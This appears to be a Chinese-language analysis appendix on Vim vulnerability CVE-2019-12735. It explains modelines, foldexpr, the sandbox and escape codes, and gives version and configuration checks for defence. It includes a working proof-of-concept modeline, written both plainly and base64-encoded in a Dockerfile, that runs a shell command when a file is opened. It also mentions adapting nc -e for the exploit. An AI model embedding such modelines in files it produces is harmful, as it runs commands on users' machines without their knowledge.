a.vim']\n\n\n\n\n\nVim\u7684folding\u529f\u80fd\n\n\n\n\n\n\nvim\u7684folding\u529f\u80fd\u7528\u4e8e\u5bf9\u6587\u672c\u4e2d\u7684\u6587\u672c\u5757\uff08\u6bd4\u5982\u4e00\u4e2a\u51fd\u6570\uff0c\u4e00\u6bb5\u6ce8\u91ca\uff09\u6298\u53e0\u548c\u5c55\u5f00\uff0c\u53ef\u4ee5\u7c7b\u6bd4\u4e3a\u56fe\u5f62\u5316\u7f16\u8f91\u5668\u7f16\u8f91\u533a\u4fa7\u680f\u7684(+/-)\u3002\n\n\n\n\n\n\nfoldmethod\u9009\u9879\u662f\u7528\u6765\u914d\u7f6eVim\u7684\u4ee3\u7801\u6298\u53e0\u529f\u80fd\u7684\uff0cVim\u7ed9\u51fa\u4e86manual, indent, expr, syntax, diff, marker\u8fd9\u51e0\u79cd\u4ee3\u7801\u6298\u53e0\u7684\u65b9\u5f0f\uff0c\u4e0b\u9762\ud83d\udc47\u662findent\u65b9\u5f0f\u7684\u6548\u679c\uff1a\n\n\n\n\n\n\n# \u6587\u672c\u5982\u4e0b\n$ vim a.py\n\n# python3\n# coding=utf-8\nimport platform\n\ndef func1():\n        for i in range(10):\n                print(\"hello vim\")\n                print(platform.platform())\n\ndef main():\n        func1()\n\nmain()\n\n\n# 1. \u8bbe\u7f6efoldmethod\u9009\u9879\n:set foldenable\n:set foldmethod=indent\n\n# \u6548\u679c\u5982\u4e0b\n# python3\n# coding=utf-8\nimport platform\n\ndef func1():\n+--  3 lines: for i in range(10):-------------------------------------\n\ndef main():\n        func1()\n\nmain()\n\n\n\n\n\n\n\u5982\u679c\u4e0d\u6ee1\u8db3\u4e8e\u7ed9\u5b9a\u7684\u51e0\u79cd\u65b9\u5f0f\uff0c\u53ef\u4ee5\u5c06foldmethod\u8bbe\u7f6e\u4e3aexpr\u6765\u81ea\u5b9a\u4e49\u4ee3\u7801\u5757\u7684\u7279\u5f81\n\n\n# \u6587\u672c\u5982\u4e0b\n$ vim a.py\n\n# python3\n# coding=utf-8\nimport platform\n\ndef func1():\n        for i in range(10):\n                print(\"hello vim\")\n                print(platform.platform())\n\ndef main():\n        func1()\n\n\nmain()\n\n:set foldenable\n:set foldmethod=expr\n:set foldexpr=getline(v:lnum)[0]==\\\"#\\\"\n# foldexpr\u7528\u4e8e\u8bbe\u7f6e\u6587\u672c\u6ee1\u8db3\u7684\u6761\u4ef6\uff0c\u6ee1\u8db3\u6761\u4ef6\u7684\u6587\u672c\u5757\u4f1a\u88ab\u6298\u53e0\n# \u8be5\u914d\u7f6e\u7684\u610f\u601d\u662f\u901a\u8fc7Vim\u7684getline\u51fd\u6570\uff0c\u5224\u65ad\u6bcf\u4e00\u884c\u6587\u672c\u7684\u7b2c\u4e00\u4e2a\u5b57\u7b26\u662f\u5426\u4e3a\"#\"\uff0c\u5c06\u6ee1\u8db3\u6761\u4ef6\u7684\u76f8\u90bb\u7684\u884c\u89c6\u4e3a\u4e00\u4e2a\u6587\u672c\u5757\uff0c\u5e76\u5c06\u5176\u6298\u53e0\n# \u6548\u679c\u5982\u4e0b: \n\n+--  2 lines: # python3-----------------------------------------------\nimport platform\n\ndef func1():\n        for i in range(10):\n                print(\"hello vim\")\n                print(platform.platform())\n\ndef main():\n        func1()\n\nmain()\n\n\n\n\n\n\n\nvim\u7684sandbox\u6982\u5ff5\n\n\n11. The sandbox                 *eval-sandbox* *sandbox* *E48*\n\n\nThe 'foldexpr', 'formatexpr', 'includeexpr', 'indentexpr', 'statusline' and\n'foldtext' options may be evaluated in a sandbox. \n\n\nThis gives some safety for when these options are set from a modeline.  \n\n\nThese items are not allowed in the sandbox:\n    - changing the buffer text\n    - defining or changing mapping, autocommands, functions, user commands\n    - setting certain options (see |option-summary|)\n    - setting certain v: variables (see |v:var|)  *E794*\n    - executing a shell command\n    - reading or writing a file\n    - jumping to another buffer or editing a file\n    - executing Python, Perl, etc. commands\n\n\n\n\n\n\nANSI escape codes\n\n\n\u53c2\u8003\uff1a\n\n\nhttps://www.gnu.org/software/screen/manual/html_node/Control-Sequences.html\n\n\nhttps://notes.burke.libbey.me/ansi-escape-codes/\n\n\nhttps://learnku.com/articles/26231\n  \n\n\n\\x1b[1G\n\n\n\\x1b[1G \u5149\u6807\u79fb\u52a8\u5230\u5f53\u524d\u884c\u7684\u7b2cPn\u4e2a\u4f4d\u7f6e\n\n\n# ESC [ Pn G                      Cursor horizontal position\n# $ echo -e \"Hello\\x1b[1GA\" > a.txt\n# $ cat a.txt\n# Aello\n# $ echo -e \"Hello\\x1b[2GA\" > a.txt\n# $ cat a.txt\n# HAllo\n# $ echo -e \"Hello\\x1b[3GA\" > a.txt\n# $ cat a.txt\n# HeAlo\n\n\n\n\n\n\\x1b[D\n\n\n\\x1b[D \u5149\u6807\u5de6\u79fb1\u4e2a\u4f4d\u7f6e\n\n\n# ESC [ Pn D                      Cursor Left\n# \u5149\u6807\u5de6\u79fbPn\u4e2a\u4f4d\u7f6e\n# $ echo -e \"Hello\\x1b[D\" > a.txt\n# $ cat a.txt\n# Hello\n# $ echo -e \"Hello\\x1b[D\\x1b[D\\x1b[DAAA\" > a.txt\n# $ cat a.txt\n# HeAAA\n# $ echo -e \"Hello\\x1b[5DAAA\" > a.txt\n# $ cat a.txt\n# AAAlo\n\n\n\n\n\n\\x1b[K\n\n\n\\x1b[K \u6e05\u9664\u5149\u6807\u5230\u5f53\u524d\u4f4d\u7f6e\u7684\u5185\u5bb9\n\n\n# *  ESC [ K           erase to end of line (inclusive)\n# \u6e05\u9664\u5149\u6807\u5230\u5f53\u524d\u4f4d\u7f6e\u7684\u5185\u5bb9(\u4e0d\u4f1a\u6539\u53d8\u6587\u672c)\uff0c\u53ef\u4ee5\u914d\u5408\\x1b[G\u4f7f\u7528\n$ echo -e \"AAAA\\x1b[1G\\x1b[KBBBB\" > a.txt\n$ cat  a.txt\nBBBB\n$ echo -e \"ABCD\\x1b[2G\\x1b[KEEEE\" > a.txt\n$ cat  a.txt\nAEEEE\n$ echo -e \"ABCD\\x1b[3G\\x1b[KEEEE\" > a.txt\n$ cat a.txt \nABEEEE\n$ echo -e \"ABCD\\x1b[KEEEE\" > a.txt\n$ cat a.txt \nABCDEEEE\n\n\n\n\n\n\\x1b[2K\n\n\n      \n\n\n\\x1b[?7l\n\n\n\n\nESC [ ? 7 l       auto wrap off  \n\n\n\n\n\\x1b[?7l \u5173\u95ed\u81ea\u52a8\u6362\u884c (l -> low)\n\n\n\n\n\n\n\\x1b[?7h \u5f00\u542f\u81ea\u52a8\u6362\u884c (h -> high)\n\n\n\n\n\u8fd9\u4e2a\u547d\u4ee4\u7684\u529f\u80fd\u662f\u63a7\u5236Terminal\u7684\u663e\u793a\u529f\u80fd\uff0c\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u5982\u679c\u6587\u672c\u957f\u5ea6\u8d85\u8fc7Terminal\u7684\u663e\u793a\u957f\u5ea6\uff0c\u5219\u4f1a\u81ea\u52a8\u6362\u884c\uff0c\u5982\u679c\u5173\u95ed\u4e86\u81ea\u52a8\u6362\u884c\uff0c\u5219\u4f1a\u5168\u90e8\u663e\u793a\u5728\u4e00\u884c\uff0c\u8d85\u51fa\u7684\u90e8\u5206\u88ab\"\u622a\u65ad\"\n\n\n\n\n\u200b\n      \n\n\n\\x1b[?7l \u548c \\x1b[1G \u914d\u5408\u4f7f\u7528\u7684\u6548\u679c\uff1a\n\n\n\u4f7f\u7528\u524d \uff1a   \n\n\n               \n\n\n\u4f7f\u7528\u540e\uff1a\n\n\n      \n\n\n\\x1b[?7l \u548c \\x1b[1G + \\x1b[K \u914d\u5408\u4f7f\u7528\u7684\u6548\u679c\uff1a      \n\n\n      \n\n\n\\x16\n\n\n\u53c2\u8003:\n\n\nhttp://defindit.com/ascii.html\n\n\nhttps://zh.wikipedia.org/wiki/%E6%8E%A7%E5%88%B6%E5%AD%97%E7%AC%A6\n  \n\n\n\u8fd9\u662f\u4e00\u4e2aascii\u7801\u7684\u63a7\u5236\u5b57\u7b26\uff0c\u4ee3\u8868 ctrl+v\uff0c\u5b83\u7684\u529f\u80fd\u53ef\u4ee5\u7406\u89e3\u4e3a\uff1a\u8ba9\u4e0b\u4e00\u4e2a\u8f93\u5165\u8bc6\u522b\u4e3a\u666e\u901a\u5b57\u7b26\n\n\n$ cat a.py\na = input(\"> \")\nprint(ord(a[0]))\n\n$ python3 a.py\n# \u60f3\u76f4\u63a5\u8f93\u5165ctrl+c, \u4f46\u7a0b\u5e8f\u9000\u51fa\uff0c\u88ab\u8bc6\u522b\u6210\u4e86\u4e2d\u65ad\u4fe1\u53f7\n> ^CTraceback (most recent call last):\n  File \"a.py\", line 1, in <module>\n    a = input(\"> \")\nKeyboardInterrupt\n\n$ python3 a.py\n# \u4f9d\u6b21\u6309\u4e0bctrl+v\u548cctrl+c, \u5c31\u987a\u5229\u6253\u5370\u51fa\u4e86ctrl+c\u7684ascii\u7801\n> ^C\n3\n\n\n\n\n\n\u4e3a\u4ec0\u4e48Exp\u4e2d\u9700\u8981\\x16\u63a7\u5236\u5b57\u7b26\n\n\necho -e \"iHello\\x1b[D\" > a.vim\n$ vim \n:source! a.vim\n\nHello\n~                                                                      ...   \n~                                                                               \nE388: Couldn't find definition\n\n\u8fd9\u4e2a\u62a5\u9519\u53ef\u4ee5\u624b\u52a8\u8f93\u5165\u4e0b\u9762\u7684\u6307\u4ee4\u4ea7\u751f\uff1a\n$ vim\ni\nHello\n<ESC>\n[\nshift+d\n\n# \u5982\u679c\u52a0\u4e0a\\x16\u5219\\x1b\u4e0d\u4f1a\u88ab\u89e3\u6790\u6210<ESC>\u6309\u952e\uff0c\u800c\u662f\u8f93\u5165\u5b57\u7b26\necho -e \"iHello\\x16\\x1b[D\" > a.vim\n\nHello^[[D\n~                                                                      ...\n~\n\n-- INSERT --\n\n\n\n\n\n\n\n\nexp\u4fee\u6539\u8bf4\u660e\n\n\n\n\nnc -> nc.traditional \n\n\n\n\nUbuntu\u4e0a\u7684nc\u4e0d\u5305\u542b-e\u9009\u9879\uff0c\u89e3\u51b3\u529e\u6cd5\u662f\u5b89\u88c5nc.traditional\u6765\u66ff\u4ee3nc\u547d\u4ee4\n\n\n\n\n\\x1b[K -> \\x1b[2K \u548c \\x1b[D -> \\x1b[2D \u548c\u7a7a\u683c\u662f\u7528\u4e8e\u6e05\u9664\u4e0d\u53ef\u89c1\u5b57\u7b26\\x16\u548c\u5f15\u53f7\n\n\n\n\n\u4fee\u6539\u524d: \n\n\n\n\n       \n\n\n\u4fee\u6539\u540e:      \n\n\n               \n\n\n       \n\n\nVim\u5b89\u88c5\n\n\napt\u81ea\u52a8\u5b89\u88c5\n\n\napt-get install vim-runtime=2:7.4.1689-3ubuntu1\napt-get install vim-common=2:7.4.1689-3ubuntu1\napt-get install vim=2:7.4.1689-3ubuntu1\n\n\n\n\n\n\u4f7f\u7528deb\u5305\u5b89\u88c5\n\n\n\u94fe\u63a5:\nhttps://pan.baidu.com/s/1rn0RqwWn0tpgk9PY0v00Jw\n \u5bc6\u7801:m0qc\n\n\nsudo dpkg -i vim_2%3a7.4.1689-3ubuntu1_amd64.deb\n\n\n\n\n\u4e0b\u8f7d\u6e90\u7801\u624b\u52a8\u7f16\u8bd1\n\n\n# \u4e0b\u8f7d\u6e90\u7801\uff0c\u7f16\u8bd1\u751f\u6210\u7b26\u53f7\n# \u53c2\u8003\uff1ahttps://www.unix.com/programming/156665-compile-debug-vim-source-code.html\n$ mkdir ~/MyVim\n$ cd ~/MyVim\n$ sudo apt-get install libncurses5-dev libncursesw5-dev\n$ apt-get source vim=2:7.4.1689-3ubuntu1\n$ cd src\n$ cp Makefile Makefile.orig\n$ vim Makefile\n$ diff Makefile Makefile.orig\n540c540\n< CFLAGS = -g\n---\n> #CFLAGS = -g\n908c908\n< prefix = ~/MyVim\n---\n> #prefix = $(HOME)\n1852c1852\n< #    $(STRIP) $(DEST_BIN)/$(VIMTARGET)\n---\n>     $(STRIP) $(DEST_BIN)/$(VIMTARGET)\n$ cd ..\n$ make && make install\n$ cd bin\n$ gdb ./vim\n\n\n\n\n\nDocker\u590d\u73b0\u73af\u5883\u642d\u5efa\n\n\n\u53ef\u4ee5\u901a\u8fc7Docker\u5feb\u901f\u642d\u5efapoc\u590d\u73b0\u73af\u5883\n\n\n$ ls\nDockerfile\n$ cat Dockerfile\nFrom ubuntu:16.04\nRUN set -e -x ;\\\n    apt update ;\\\n    apt-get install -y vim-runtime=2:7.4.1689-3ubuntu1 ;\\\n    apt-get install -y vim-common=2:7.4.1689-3ubuntu1 ;\\\n    apt-get install -y vim=2:7.4.1689-3ubuntu1 ;\\\n    echo \"OiF1bmFtZSAtYXx8IiB2aTpmZW46ZmRtPWV4cHI6ZmRlPWFzc2VydF9mYWlscygic291cmNlXCFcIFwlIik6ZmRsPTA6ZmR0PSIK\" | base64 --decode > /root/poc.txt \n\n$ sudo docker build -t vim-cve-2019-12735 .\n$ sudo docker run -it vim-cve-2019-12735 /bin/bash\necho -e \"set modeline\\nset modelines=5\" > ~/.vimrc \ncd root\nvim poc.txt\n\n\n\n\n\n\n\u6f0f\u6d1e\u9632\u62a4\n\n\npackage\u7248\u672c\u68c0\u67e5\n\n\n\n\n\u67e5\u770b\u53ef\u5b89\u88c5\u7684Vim\u7248\u672c\n\n\n\n\n# \u67e5\u770b\u53ef\u5b89\u88c5\u7684Vim\u7248\u672c\n$ apt-cache policy vim\nvim:\n  Installed: (none)\n  Candidate: 2:7.4.1689-3ubuntu1.4\n  Version table:\n     2:7.4.1689-3ubuntu1.4 500\n        500 https://mirrors.tuna.tsinghua.edu.cn/ubuntu xenial-updates/main amd64 Packages\n        500 https://mirrors.tuna.tsinghua.edu.cn/ubuntu xenial-security/main amd64 Packages\n     2:7.4.1689-3ubuntu1 500\n        500 https://mirrors.tuna.tsinghua.edu.cn/ubuntu xenial/main amd64 Packages\n\n# \u4eceVim\u5305\u7684changelog\u4e2d\u83b7\u53d6\u4fee\u590d\u6f0f\u6d1e\u7684\u7248\u672c\u53f7 2:7.4.1689-3ubuntu1.3\n$ cat vim_changelog.txt |grep CVE-2019-12735 -C 10\n...\nvim (2:7.4.1689-3ubuntu1.3) xenial-security; urgency=medium\n\n  * SECURITY UPDATE: Arbitrary code execution\n    - debian/patches/CVE-2019-12735.patch: disallow\n      sourcing a file in the sandbox in src/getchar.c\n    - CVE-2019-12735\n  * SECURITY UPDATE: Buffer overflow\n    - debian/patches/CVE-2017-5953.patch: check for an\n      invalid length in order to avoid a overflow in\n      src/spell.c.\n    - CVE-2017-5953\n\n\n -- Leonidas S. Barbosa <leo.barbosa@canonical.com>  Fri, 07 Jun 2019 12:35:43 -0300\n\n\n\n\n\n\n\n\n\u5b89\u88c5\u5b58\u5728\u6f0f\u6d1e\u7684\u7248\u672c\n\n\n\n\n\n$ sudo apt install vim-common=2:7.4.1689-3ubuntu1\n$ sudo apt install vim-runtime=2:7.4.1689-3ubuntu1\n$ sudo apt install vim=2:7.4.1689-3ubuntu1\n\n# \u901a\u8fc7apt-cache \u67e5\u770b\u5df2\u5b89\u88c5\u7684\u7248\u672c < 2:7.4.1689-3ubuntu1.3\n$ apt-cache policy vim:\n  Installed: 2:7.4.1689-3ubuntu1\n  Candidate: 2:7.4.1689-3ubuntu1.4\n  ...\n\n# \u914d\u7f6evimrc\u5f00\u542fmodeline\u529f\u80fd\nvim ~/.vimrc\ni\nset modeline\nset modelines=5\n<ESC>\n:w\n\n# \u6d4b\u8bd5\u6548\u679c\n$ vim poc.txt\n\nLinux ubuntu 4.15.0-45-generic #48~16.04.1-Ubuntu SMP Tue Jan 29 18:03:48 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux\n\n\nPress ENTER or type command to cont\n\n\n\n\n\n\n\n\u5b89\u88c5\u6700\u65b0\u7248\u672c\u7684vim\n\n\n\n\n# \u5b89\u88c5\u6700\u65b0\u7248\u672c\u7684vim\n$ sudo apt install vim\n\n# \u901a\u8fc7apt-cache \u67e5\u770b\u5df2\u5b89\u88c5\u7684\u7248\u672c > 2:7.4.1689-3ubuntu1.3\n$ apt-cache policy vim\nvim:\n  Installed: 2:7.4.1689-3ubuntu1.4\n  Candidate: 2:7.4.1689-3ubuntu1.4\n  ...\n\n# \u914d\u7f6evimrc\u5f00\u542fmodeline\u529f\u80fd\nvim ~/.vimrc\ni\nset modeline\nset modelines=5\n<ESC>\n\n\n# \u6d4b\u8bd5\u6548\u679c\uff0c\u672a\u89e6\u53d1\u6f0f\u6d1e\n$ vim poc.txt\n:!uname -a||\" vi:fen:fdm=expr:fde=assert_fails(\"source\\!\\ \\%\"):fdl=0:fdt=\"\n~                                                                      ...                                                                    \n~                                                                               \n\"poc.txt\" 1L, 75C  \n\n\n\n\n\n\u914d\u7f6e\u68c0\u67e5\n\n\n# \u68c0\u67e5modeline\u914d\u7f6e:\n$ vim\n:verbose set modeline? \n:verbose set modelines?\n# \u5982\u679c\u663e\u793anomodeline, nomodelines\u8868\u793a\u6ca1\u6709\u914d\u7f6e\n\n# \u5982\u679c\u914d\u7f6e\u4e86\uff0c\u5219\u4f1a\u663e\u793a\uff1a\n\n...\n\uff5e                                                                 \n  modeline\n        Last set from ~/.vimrc\nPress ENTER or type command to continue\n\n...\n\uff5e\n  modelines=5\n        Last set from ~/.vimrc\nPress ENTER or type command to continue\n\n# \u5173\u95edmodeline\u914d\u7f6e\nvim ~/.vimrc\n\u5220\u9664\nset modeline\nset modelines=5\n\u6dfb\u52a0\nset nomodeline\n:wq\n\n# \u518d\u6b21\u68c0\u67e5\n$ vim\n:verbose set modeline? \n\n~                                                                     \nnomodeline\n        Last set from ~/.vimrc\nPress ENTER or type command to continue\n\n\n\n\n\n\npoc\u9a8c\u8bc1\n\n\n\u8bfb\u53d6stdout\n\n\n\u4ee3\u7801\u6267\u884cvim\u6253\u5f00poc\u8bfb\u53d6stdout\u6839\u636e\u8f93\u51fa\u5224\u65ad(\u76ee\u524d\u7684\u6765\u770b\uff0c\u83b7\u53d6vim\u7684\u8f93\u51fa\u8c8c\u4f3c\u6709\u4e9b\u9ebb\u70e6)\n\n\n\u4e0d\u5b58\u5728\u6f0f\u6d1e\u65f6\u91cd\u5b9a\u5411stdout: \n\n\n$ vim poc.txt >out.txt\nVim: Warning: Output is not to a terminal\n$ cat out.txt \n# \u5185\u5bb9\u4e3a\u7a7a \n\n\n\n\n\n\u5b58\u5728\u6f0f\u6d1e\u65f6\u91cd\u5b9a\u5411stdout: \n\n\n$ vim poc.txt > out.txt\nVim: Warning: Output is not to a terminal\n\nPress ENTER or type command to continue\n\n$ cat out.txt \nLinux ubuntu 4.4.0-112-generic #135-Ubuntu SMP Fri Jan 19 11:48:36 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux\n\n\n\n\n\n\n\u68c0\u67e5\u8c03\u7528\u6808\n\n\n\u7c7b\u4f3c\u7684\uff0c\u901a\u8fc7\u4ee3\u7801\u6267\u884cvim\u6253\u5f00poc\uff0cptrace\u8c03\u7528\u6808\uff0c\u68c0\u67e5\u662f\u5426\u6709do_shell\u8c03\u7528\u65e0\u6f0f\u6d1e\u65f6\u6b63\u5e38\u6253\u5f00poc\u6587\u4ef6\u540e\u7684\u8c03\u7528\u6808\uff1a\n\n\ngdb-peda$ bt\n#0  0x00007fca6f40b5b3 in __select_nocancel ()\n#1  0x000000000052a69c in RealWaitForChar (fd=0x0, \n#2  0x000000000052a444 in WaitForCharOrMouse \n#3  0x000000000052a393 in WaitForChar (msec=0xffffffffffffffff)\n#4  0x0000000000526147 in mch_inchar (buf=0x86c66a <typebuf_init+42> \n#5  0x00000000005c381e in ui_inchar (buf=0x86c66a <typebuf_init+42> \n#6  0x00000000004ad1fe in inchar (buf=0x86c66a <typebuf_init+42> \"\", \n#7  0x00000000004ace26 in vgetorpeek (advance=0x1) at getchar.c:2832\n#8  0x00000000004ab07e in vgetc () at getchar.c:1605\n#9  0x00000000004ab526 in safe_vgetc () at getchar.c:1801\n#10 0x00000000004f8512 in normal_cmd (oap=0x7ffefbcad0c0, \n#11 0x00000000005e96fb in main_loop (cmdwin=0x0, noexmode=0x0) at \n#12 0x00000000005e90e3 in main (argc=0x2, argv=0x7ffefbcad3b8) at \n...\n\n\n\n\n\n\u5b58\u5728\u6f0f\u6d1e\u65f6\uff0c\u6253\u5f00poc\u6587\u4ef6\u540e\u7684\u8c03\u7528\u6808\uff0c\u6709\u4e00\u4e2a\u660e\u663e\u7684do_shell\u7684\u8c03\u7528:\n\n\ngdb-peda$ bt\n#0  0x00007f4ba14135b3 in __select_nocancel ()\n#1  0x000000000052a69c in RealWaitForChar (fd=0x0, \n#2  0x000000000052a444 in WaitForCharOrMouse \n#3  0x000000000052a393 in WaitForChar (msec=0xffffffffffffffff)\n#4  0x0000000000526147 in mch_inchar (buf=0x86c66a <typebuf_init+42> \n#5  0x00000000005c381e in ui_inchar (buf=0x86c66a <typebuf_init+42> \n#6  0x00000000004ad1fe in inchar (buf=0x86c66a <typebuf_init+42> \"\", \n#7  0x00000000004ace26 in vgetorpeek (advance=0x1) at getchar.c:2832\n#8  0x00000000004ab07e in vgetc () at getchar.c:1605\n#9  0x00000000004ab526 in safe_vgetc () at getchar.c:1801\n#10 0x00000000004ce972 in wait_return (redraw=0x1) at message.c:901\n#11 0x000000000045ce32 in do_shell (\n    cmd=0x15c7ea0 \"uname -a||\\\" vi:fen:fdm=expr:fde=assert_fails(\\\"source!\\\\ %\\\"):fdl=0:fdt=\\\"\", flags=0x0) at ex_cmds.c:1572\n#12 0x000000000045c50c in do_bang (addr_count=0x0, \n#13 0x000000000047f480 in ex_bang (eap=0x7ffe20228c50) at \n#14 0x00000000004741d3 in do_one_cmd (cmdlinep=0x7ffe20228d80, \n#15 0x0000000000470d89 in do_cmdline (cmdline=0x0, \n#16 0x00000000005002cd in nv_colon (cap=0x7ffe202293f0) at \n#17 0x00000000004f9650 in normal_cmd (oap=0x7ffe20229480, \n#18 0x00000000005e96fb in main_loop (cmdwin=0x0, noexmode=0x0) at \n#19 0x00000000005e90e3 in main (argc=0x2, argv=0x7ffe20229778) at",
            "title": "Cve 2019 12735 \u9644\u4ef6"
        },
        {
            "location": "/userspace/cve-2019-12735-\u9644\u4ef6/#vimcve-2019-12735",
            "text": "",
            "title": "Vim\u6f0f\u6d1e\u5206\u6790\u9644\u4ef6(cve-2019-12735)"
        },
        {
            "location": "/userspace/cve-2019-12735-\u9644\u4ef6/#_1",
            "text": "",
            "title": "\u80cc\u666f\u77e5\u8bc6"
        },
        {
            "location": "/userspace/cve-2019-12735-\u9644\u4ef6/#vim",
            "text": "\u53c2\u8003\uff1ahttp://vimdoc.sourceforge.net/htmldoc/intro.html#vim-modes-intro     Normal mode  \u901a\u8fc7 $ vim file \u6253\u5f00\u6587\u4ef6\u540e\u8fdb\u5165\u7684\u6a21\u5f0f  $ vim hello.txt\nHello\n~                                                                     \n~                                                                      \n~                                                                      ...\n~                                                                               \n\"hello.txt\" 1L, 6C  \u901a\u8fc7source!\u52a0\u8f7d\u7684\u811a\u672c\u7684\u5185\u5bb9\uff0c\u5c31\u662f\u76f8\u5f53\u4e8e\u5728\u8fd9\u4e2a\u6a21\u5f0f\u4e0b\u8f93\u5165\u7684\u5185\u5bb9  Command-line mode    \u5728normal mode\u4e0b\u8f93\u5165 : ( and / ? ) \u8fdb\u5165Command-line mode    \u5728Vim\u7684Command-line\u6a21\u5f0f\u4e0b\uff0c\u53ef\u4ee5\u6267\u884cVim commands   \u5176\u4e2d\uff0c\u901a\u8fc7  :!{shell cmd}  \u53ef\u4ee5\u6267\u884cshell\u547d\u4ee4   # http://vimdoc.sourceforge.net/htmldoc/various.html#:!\n$ vim\n:!uname -a\n\nLinux ubuntu 4.4.0-112-generic #135-Ubuntu SMP Fri Jan 19 11:48:36 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux\n\nPress ENTER or type command to continue  Ex mode    \u901a\u8fc7 $ vim -e  file \u8fdb\u5165\u8be5\u6a21\u5f0f    \u4e5f\u53ef\u4ee5\u5728Normal mode\u4e0b\u8f93\u5165Q\u8fdb\u5165\u8be5\u6a21\u5f0f   \u8fd9\u4e2a\u6a21\u5f0f\u7684\u7279\u70b9\u662f\u53ef\u4ee5\u8fde\u7eed\u6267\u884cVim command\uff0c\u53ef\u4ee5\u7c7b\u6bd4 python \u7684\u547d\u4ee4\u884c\u6a21\u5f0f  \u901a\u8fc7source\u52a0\u8f7d\u7684\u811a\u672c\u7684\u5185\u5bb9\uff0c\u5c31\u662f\u76f8\u5f53\u4e8e\u5728\u8fd9\u4e2a\u6a21\u5f0f\u4e0b\u8f93\u5165\u7684\u5185\u5bb9   Insert mode    \u5728Normal mode\u4e0b\u8f93\u5165i\u53ef\u4ee5\u8fdb\u5165Insert mode, \u8fd9\u4e2a\u6a21\u5f0f\u76f8\u5f53\u4e8e\u7f16\u8f91\u6a21\u5f0f\uff0c\u5927\u90e8\u5206\u64cd\u4f5c\u548c\u5728\u8bb0\u4e8b\u672c\u4e2d\u4e00\u6837\u3002    \u53e6\u5916\u8fd8\u6709 \"I\", \"a\", \"A\", \"o\", \"O\", \"c\", \"C\", \"s\" or S\"\u4e5f\u53ef\u4ee5\u4eceNormal mode\u8fdb\u5165Insert mode.    \u5177\u4f53\u6a21\u5f0f\u8f6c\u6362\u89c1:  http://vimdoc.sourceforge.net/htmldoc/intro.html#vim-modes-intro    \u5176\u4e2d\"S\"\u8868\u793a\u526a\u5207\u5f53\u524d\u884c\uff0c\u5e76\u8fdb\u5165Insert mode    # :help S\n# [\"x]S                   Delete [count] lines [into register x] and start\n#                           insert.  Synonym for \"cc\" |linewise|.\n\n# Demo\u6f14\u793a\n$ vim 1.vim\n:let i = 1\n:while i < 10\n:    let a = getline(i)\n:    if empty(a)\n:        break\n:    endif\n:    echo \"Line:\" i \"is\"  a\n:    let i += 1\n:endwhile\n~                                                                      \n...     \n~                                                                               \n\"1.vim\" 9L, 147C\n\nS(shift+s)\n\n\n:while i < 10\n:    let a = getline(i)\n:    if empty(a)\n:        break\n:    endif\n:    echo \"Line:\" i \"is\"  a\n:    let i += 1\n:endwhile\n~                                                                      ...\n~\n\n-- INSERT --\n<ESC>\np  (p\u662f\u7c98\u8d34)\np\n\n\n:let i = 1\n:let i = 1\n:while i < 10\n:    let a = getline(i)\n:    if empty(a)\n:        break\n:    endif\n:    echo \"Line:\" i \"is\"  a\n:    let i += 1\n:endwhile\n~                                                                      ...",
            "title": "Vim\u7684\u6a21\u5f0f"
        },
        {
            "location": "/userspace/cve-2019-12735-\u9644\u4ef6/#vim-options",
            "text": "Vim\u7684options\u76f8\u5f53\u4e8e\u7f16\u8f91\u5668\u7684\u914d\u7f6e\uff0c\u901a\u8fc7command-line\u6a21\u5f0f\u7684:set\u547d\u4ee4\u624b\u52a8\u914d\u7f6e\uff0c\u4e5f\u53ef\u4ee5\u901a\u8fc7\u811a\u672c\u81ea\u52a8\u914d\u7f6e\uff0c\u81ea\u52a8\u914d\u7f6e\u7684\u65b9\u6cd5\u4e3b\u8981\u662f\u901a\u8fc7Vim\u811a\u672c(.vimrc, .exrc)\u6216\u8005modeline\u65b9\u5f0f\u3002",
            "title": "Vim options\u7684\u6982\u5ff5"
        },
        {
            "location": "/userspace/cve-2019-12735-\u9644\u4ef6/#vimmodeline",
            "text": "\u53c2\u80031:  http://vimdoc.sourceforge.net/htmldoc/options.html#modeline    \u53c2\u80032:  https://vim.fandom.com/wiki/Modeline_magic    modeline\u7528\u4e8e\u5728\u6587\u672c\u6587\u4ef6\u7684\u9996\u90e8\u6216\u8005\u5c3e\u90e8\u8bbe\u7f6evim options, \u8ba9vim\u6253\u5f00\u6587\u4ef6\u7684\u65f6\u5019\u81ea\u52a8\u52a0\u8f7d\u5e76\u6267\u884c\u8be5\u914d\u7f6e  \n# modeline \u6709\u4e24\u79cd\u683c\u5f0f\n# \u7b2c\u4e00\u79cd\u683c\u5f0f\uff1a [text]{white}{vi:|vim:|ex:}[white]{options}\n#                           vi:noai:sw=3 ts=6 \n# - text\u53ef\u4ee5\u7528\u6765\u653e\u7f6e\u7f16\u7a0b\u8bed\u8a00\u7684\u6ce8\u91ca(python\u7684 # , C \u7684// )\uff0c\u662f\u53ef\u9009\u7684\n# - vi:\u4e4b\u524d\u4e00\u5b9a\u8981\u6709\u7a7a\u683c\n# - options\u7528\":\"\u6216\u8005\u7a7a\u683c\u5206\u9694\n\n\n# \u7b2c\u4e8c\u79cd\u683c\u5f0f\uff1a    \n#  [text]{white}{vi:|vim:|ex:}[white]se[t] {options}:[text]\n#               /* vim: set ai tw=75: */ \n# - \u9996\u5c3e\u90fd\u53ef\u4ee5\u7528text\u4e3b\u8981\u662f\u652f\u6301(C\u7684\u8fd9\u79cd\u6ce8\u91ca \"/**/\")\uff0c\u9996\u5c3e\u7684text\u90fd\u662f\u53ef\u9009\u7684\n# - vim: \u540e\u9762\u8981\u6709\u7a7a\u683c\n# - \u8981\u6709\u4e00\u4e2aset(\u53ef\u4ee5\u7f29\u5199\u6210 se\uff0c\u540e\u9762\u8ddf\u7a7a\u683c)\n# - options\u7528\u7a7a\u683c\u5206\u9694\n# - \u7ed3\u5c3e\u8981\u6709\u5192\u53f7 :   \u5f00\u542fmodeline  # \u7f16\u8f91~/.vimrc\n# \u6dfb\u52a0\uff1a\nset modeline\nset modelines=5  \u5177\u4f53\u4f7f\u7528  # \u7528Vim\u6253\u5f00\u6587\u672c\uff1a\n$ vim a.py\n# python3\n# coding=utf-8\nimport platform\n\ndef func1():\n        for i in range(10):\n                print(\"hello vim\")\n                print(platform.platform())\n# cursor is here \n\ndef main():\n        